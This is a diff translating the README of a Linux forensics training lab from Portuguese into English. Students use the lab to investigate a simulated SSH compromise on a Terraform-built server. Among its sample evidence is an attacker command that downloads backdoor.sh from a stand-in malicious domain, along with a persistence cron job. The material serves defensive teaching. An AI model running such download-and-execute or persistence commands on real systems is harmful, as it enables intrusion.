@@ -1,86 +1,86 @@
 # 🔍 GLOBOMANTICS FORENSICS LAB
 
-## Cenário
+## Scenario
 
-Um servidor da Globomantics foi **comprometido há aproximadamente 1 hora**. 
+A Globomantics server has been **compromised approximately 1 hour ago**. 
 
-Sua missão é **investigar o servidor** e responder:
-- Quando começou o ataque?
-- Como o atacante entrou?
-- O que ele fez?
-- Quais arquivos foram modificados?
-- O atacante ainda está lá?
+Your mission is to **investigate the server** and answer:
+- When did the attack begin?
+- How did the attacker get in?
+- What did they do?
+- Which files were modified?
+- Is the attacker still there?
 
 ---
 
-## Como Funciona
+## How It Works
 
-### ✅ O que você FAZ:
-- SSH para o servidor
-- Lê logs e arquivos
-- Investiga evidências
-- Escreve um relatório
+### ✅ What You DO:
+- SSH into the server
+- Read logs and files
+- Investigate evidence
+- Write a report
 
-### ❌ O que você NÃO faz:
-- Não executa scripts
-- Não modifica nada
-- Não apaga logs
-- Não se conecta a processos
+### ❌ What You DON'T do:
+- Don't execute scripts
+- Don't modify anything
+- Don't delete logs
+- Don't connect to processes
 
 ---
 
 ## Quick Start
 
-### 1. Criar Infraestrutura
+### 1. Create Infrastructure
 ```bash
 cd terraform
 terraform init
 terraform apply
 ```
 
-### 2. Conectar ao Servidor
+### 2. Connect to Server
 ```bash
 export SERVER_IP=$(terraform output -raw server_ip)
 ssh -i terraform/keys/globomantics.pem ubuntu@$SERVER_IP
 ```
 
-### 3. Investigar (Passo a Passo)
+### 3. Investigate (Step by Step)
 
-#### PASSO 1: Status Atual
+#### STEP 1: Current Status
 ```bash
 who
 date
 uptime
 ```
 
-#### PASSO 2: Investigar Logins
+#### STEP 2: Investigate Logins
 ```bash
 last -f /var/log/wtmp
 sudo lastb -f /var/log/btmp
 sudo cat /var/log/auth.log | tail -50
 ```
 
-#### PASSO 3: Investigar Histórico
+#### STEP 3: Investigate History
 ```bash
 cat ~/.bash_history
 sudo cat /root/.bash_history
 ```
 
-#### PASSO 4: Arquivos Suspeitos
+#### STEP 4: Suspicious Files
 ```bash
 find / -mmin -60 2>/dev/null
 ls -lart /tmp/
 find /tmp -type f -newer /etc/hostname
 ```
 
-#### PASSO 5: Processos Ativos
+#### STEP 5: Active Processes
 ```bash
 ps aux
 netstat -tlnp 2>/dev/null
 ss -tlnp 2>/dev/null
 ```
 
-#### PASSO 6: Cron Jobs
+#### STEP 6: Cron Jobs
 ```bash
 sudo crontab -l
 crontab -l
@@ -88,95 +88,95 @@ sudo cat /etc/crontab
 ls -la /etc/cron.d/
 ```
 
-### 4. Escrever Relatório
+### 4. Write Report
 
-Crie um arquivo `INCIDENT_REPORT.md` respondendo:
+Create a file `INCIDENT_REPORT.md` answering:
 
-1. **QUANDO começou?**
-   - Hora exata do primeiro login suspeito
+1. **WHEN did it start?**
+   - Exact time of first suspicious login
 
-2. **COMO entrou?**
-   - IP do atacante
-   - Método (SSH brute force, vulnerabilidade, etc)
+2. **HOW did they get in?**
+   - Attacker IP
+   - Method (SSH brute force, vulnerability, etc)
 
-3. **O QUE fez?**
-   - Lista de comandos em ordem
-   - Arquivos criados/modificados
+3. **WHAT did they do?**
+   - List of commands in order
+   - Files created/modified
 
-4. **QUAIS arquivos foram alterados?**
-   - Caminhos dos arquivos
-   - Hora de criação/modificação
+4. **WHICH files were changed?**
+   - File paths
+   - Creation/modification times
 
-5. **AINDA está lá?**
-   - Processos ativos do atacante?
-   - Backdoors instalados?
+5. **IS the attacker still there?**
+   - Active attacker processes?
+   - Installed backdoors?
 
 ---
 
-## O Que Você Vai Encontrar
+## What You Will Find
 
-### 📋 Logs de Ataque
-Localização: `/var/log/auth.log`
+### 📋 Attack Logs
+Location: `/var/log/auth.log`
 
-Você verá:
-- Tentativas de login falhadas
-- Eventual login bem-sucedido
-- Hora exata do acesso
+You will see:
+- Failed login attempts
+- Eventual successful login
+- Exact time of access
 
-### 📝 Histórico de Comandos
-Localização: `/home/ubuntu/.bash_history` e `/root/.bash_history`
+### 📝 Command History
+Location: `/home/ubuntu/.bash_history` and `/root/.bash_history`
 
-Você verá:
-- Comandos que o atacante executou
-- Ordem das ações
-- Tentativas de escalação de privilégio
+You will see:
+- Commands executed by attacker
+- Order of actions
+- Privilege escalation attempts
 
-### 📂 Arquivos Suspeitos
-Localização: `/tmp/` e `.hidden/`
+### 📂 Suspicious Files
+Location: `/tmp/` and `.hidden/`
 
-Você verá:
-- Scripts de backdoor
-- Ferramentas de ataque
-- Dados roubados
+You will see:
+- Backdoor scripts
+- Attack tools
+- Stolen data
 
 ### ⏰ Cron Jobs
-Localização: `/var/spool/cron/crontabs/`
+Location: `/var/spool/cron/crontabs/`
 
-Você verá:
-- Jobs novos criados por atacante
-- Mecanismos de persistência
+You will see:
+- New jobs created by attacker
+- Persistence mechanisms
 
 ---
 
-## Estrutura do Projeto
+## Project Structure
 
 ```
 forensics-lab/
 ├── terraform/
-│   ├── main.tf           (Infraestrutura AWS)
-│   ├── variables.tf      (Variáveis)
-│   ├── user-data.sh      (Simula o ataque)
-│   └── keys/             (SSH keys geradas)
-├── README.md             (Este arquivo)
-├── ENUNCIADO.md          (Instruções completas)
-└── SOLUCAO.md            (Respuestas esperadas)
+│   ├── main.tf           (AWS Infrastructure)
+│   ├── variables.tf      (Configuration)
+│   ├── user-data.sh      (Simulates attack)
+│   └── keys/             (Generated SSH keys)
+├── README.md             (This file)
+├── SOLUCAO.md            (Expected solutions)
+└── PLURALSIGHT_SUBMISSION.md (Submission answers)
 ```
 
 ---
 
-## Tempo Estimado
+## Time Estimate
 
-| Fase | Tempo |
-|------|-------|
+| Phase | Time |
+|-------|------|
 | Terraform setup | 5 min |
-| SSH + exploração | 3 min |
-| Investigação | 15-20 min |
-| Escrita de relatório | 5-10 min |
+| SSH + initial exploration | 3 min |
+| Investigation | 15-20 min |
+| Write report | 5-10 min |
 | **Total** | **25-40 min** |
 
 ---
 
-## Limpeza
+## Cleanup
 
 ```bash
 cd terraform
@@ -185,27 +185,27 @@ terraform destroy
 
 ---
 
-## Conceitos Aprendidos
+## Concepts You Will Learn
 
-✅ Análise de logs de segurança
-✅ Investigação forense Linux
-✅ Identificação de artefatos de ataque
-✅ Timeline de incidentes
-✅ Detecção de backdoors
-✅ Documentação de forensics
+✅ Security log analysis
+✅ Linux forensic investigation
+✅ Attack artifact identification
+✅ Incident timeline creation
+✅ Backdoor detection
+✅ Forensic documentation
 
 ---
 
-## Exemplos de Evidências
+## Evidence Examples
 
-### 1. Login Suspeito
+### 1. Suspicious Login
 ```
 Invalid user attacker from 203.45.67.89 port 54321
 Failed password for ubuntu from 203.45.67.89 port 54323
 Accepted password for ubuntu from 203.45.67.89 port 54330
 ```
 
-### 2. Comandos Executados
+### 2. Executed Commands
 ```
 wget https://malicious-domain.com/backdoor.sh
 chmod +x backdoor.sh
@@ -213,7 +213,7 @@ chmod +x backdoor.sh
 crontab -e
 ```
 
-### 3. Arquivos Criados
+### 3. Created Files
 ```
 /tmp/.hidden/monitor.sh
 /tmp/update.py
@@ -221,24 +221,24 @@ crontab -e
 /tmp/sudo_abuse
 ```
 
-### 4. Cron Job Suspeito
+### 4. Suspicious Cron Job
 ```
 */15 * * * * /tmp/.hidden/monitor.sh
 ```
 
 ---
 
-## Dicas para Investigação
+## Investigation Tips
 
-1. **Procure por mudanças de hora**: Arquivos com modificação próxima a 1 hora atrás
-2. **Siga o IP**: O mesmo IP aparece em vários logs?
-3. **Procure por "sudo"**: Escalação de privilégio é comum
-4. **Verifique /tmp**: Atacantes costumam usar /tmp para files
-5. **Procure por cron jobs**: Mecanismo comum de persistência
-6. **Verifique usuários novos**: `cat /etc/passwd`
+1. **Look for time changes**: Files modified around 1 hour ago
+2. **Follow the IP**: Does the same IP appear in multiple logs?
+3. **Search for "sudo"**: Privilege escalation is common
+4. **Check /tmp**: Attackers often use /tmp for files
+5. **Look for cron jobs**: Common persistence mechanism
+6. **Check for new users**: `cat /etc/passwd`
 
 ---
 
-**Boa sorte na investigação! 🔍**
+**Good luck with your investigation! 🔍**
 
-Lembre-se: Você é um Incident Response Engineer. Documente tudo.
+Remember: You are an Incident Response Engineer. Document everything.
